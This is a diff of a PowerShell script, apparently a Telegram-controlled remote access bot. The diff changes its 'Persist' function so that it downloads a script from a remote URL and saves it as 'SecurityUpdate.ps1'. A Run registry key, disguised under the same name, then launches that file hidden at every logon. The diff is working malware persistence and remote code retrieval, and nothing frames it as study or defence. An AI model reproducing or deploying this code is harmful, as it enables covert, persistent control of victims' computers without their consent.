@@ -24,9 +24,7 @@ function Persist {
         reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v SecurityUpdate /f
         
         #Send-Message "Downloading.."
-        #Invoke-WebRequest -Uri $persistPath -OutFile C:\Users\$env:username\SecurityUpdate.ps1
-        Copy-Item -Path "$pwd\SpaceSec_Bot.ps1" -Destination "$ENV:UserProfile\SecurityUpdate.ps1" -PassThru
-        #Copy-Item $runPath "$ENV:UserProfile\SecurityUpdate.ps1"
+        Invoke-WebRequest -Uri $persistPath -OutFile $ENV:UserProfile\SecurityUpdate.ps1
         
 		    reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v SecurityUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file $ENV:UserProfile\SecurityUpdate.ps1"
 
@@ -337,7 +335,7 @@ While ($DoNotExit)  {
 	    #The message sent is unknown
 		    #$Message = "Sorry $($LastMessage.Message.from.first_name), but I don't understand ""$($LastMessageText)""!"
 		    #$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html" -UserAgent Edge -UseBasicParsing
-        }
+        	}
 	  }
 	}
 }
